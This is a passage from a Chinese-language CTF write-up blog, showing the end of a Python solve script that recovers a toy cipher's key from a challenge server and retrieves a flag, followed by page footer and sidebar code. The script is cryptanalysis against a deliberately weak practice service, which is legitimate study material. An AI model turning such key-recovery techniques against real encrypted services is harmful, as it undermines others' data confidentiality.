x.append(unhexlify(r.recvline().strip()))</span><br><span class="line">                print(x)</span><br><span class="line">                #获取key</span><br><span class="line">                key_prefix = []</span><br><span class="line">                </span><br><span class="line">                #1.获取key[:4]</span><br><span class="line">                for i in range(1,5):</span><br><span class="line">                    if(i % 2 == 0):</span><br><span class="line">                        temp = (xorl(x[0],x[i]))[i-2]</span><br><span class="line">                    elif(i % 2 == 1):</span><br><span class="line">                        temp = (xorl(x[0],x[i]))[i]</span><br><span class="line">                    for j in range(255):</span><br><span class="line">                        t1 = (S[j]&gt;&gt;6) + ((S[j]&amp;0b111111)&lt;&lt;2)</span><br><span class="line">                        t2 = (S[j^1]&gt;&gt;6) + ((S[j^1]&amp;0b111111)&lt;&lt;2)</span><br><span class="line">                        if(t1^t2 == temp):</span><br><span class="line">                            key_prefix.append(inv_S[S[j]])</span><br><span class="line">                            break</span><br><span class="line">                key_prefix = key_prefix[::-1]</span><br><span class="line">                print(key_prefix)</span><br><span class="line">                #2.获取key[4:]</span><br><span class="line">                temp = r.recvuntil(b&quot;&gt; &quot;)</span><br><span class="line">                r.sendline(b&quot;1&quot;)</span><br><span class="line">                temp = r.recvuntil(b&quot;plz enter your plaintext: &quot;)</span><br><span class="line">                r.sendline(hexlify(long_to_bytes(List2Int(key_prefix))))</span><br><span class="line">                key_suffix = Int2List(bytes_to_long(unhexlify(r.recvline().strip())))</span><br><span class="line">                T = [0,0,0,0]</span><br><span class="line">                temp = l([S[i] for i in T])</span><br><span class="line">                key_suffix = xorl(temp, key_suffix)</span><br><span class="line">                key_final = long_to_bytes(List2Int(key_prefix)) + long_to_bytes(List2Int(key_suffix))</span><br><span class="line">                </span><br><span class="line">                print(key_final)</span><br><span class="line">                #获取flag</span><br><span class="line">                temp = r.recvuntil(b&quot;&gt; &quot;)</span><br><span class="line">                r.sendline(b&quot;2&quot;)</span><br><span class="line">                temp = r.recvuntil(b&quot;cipher is &quot;)</span><br><span class="line">                cipher = unhexlify(r.recvline().strip())</span><br><span class="line">                t = decrypt(key_final,cipher,inv_S)</span><br><span class="line">                r.sendline(t)</span><br><span class="line">                temp = r.recvline()</span><br><span class="line">                print(temp)</span><br><span class="line">                if(b&quot;fake!&quot; not in temp):</span><br><span class="line">                    return                </span><br><span class="line">                r.close()</span><br><span class="line">            except:</span><br><span class="line">                pass</span><br><span class="line"></span><br><span class="line">getflag()</span><br><span class="line"></span><br><span class="line">#b&quot;plz enter your plaintext: b&#x27;flag&#123;21a7369e-b123-05cb-e80a-982a4f85308a&#125;&#x27;\n&quot;</span><br></pre></td></tr></table></figure>


    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2024/04/28/xyctf2024/" rel="prev" title="xyctf 2024">
      <i class="fa fa-chevron-left"></i> xyctf 2024
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-number">1.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ez-wire"><span class="nav-number">1.0.1.</span> <span class="nav-text">ez_wire</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#crypto"><span class="nav-number">2.</span> <span class="nav-text">crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#easyntru"><span class="nav-number">2.0.1.</span> <span class="nav-text">easyntru</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-encrypt"><span class="nav-number">2.0.2.</span> <span class="nav-text">easy_encrypt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#baby-dfa"><span class="nav-number">2.0.3.</span> <span class="nav-text">baby_dfa</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">rota</p>
  <div class="site-description" itemprop="description">少年不惧岁月长，彼方尚有荣光在</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">5</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">rota</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
    <span class="post-meta-divider">|</span>
<!-- 不蒜子计数初始值纠正 -->
<script>
$(document).ready(function() {

    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
    var countOffset = 20000;  // 初始化首次数据

    function fixCount() {            
       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
        {
            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
            clearInterval(int);
        }                  
        if ($("#busuanzi_container_site_pv").css("display") != "none")
        {
            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
            clearInterval(int); // 停止检测
        }  
    }
       	
});
</script> 


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
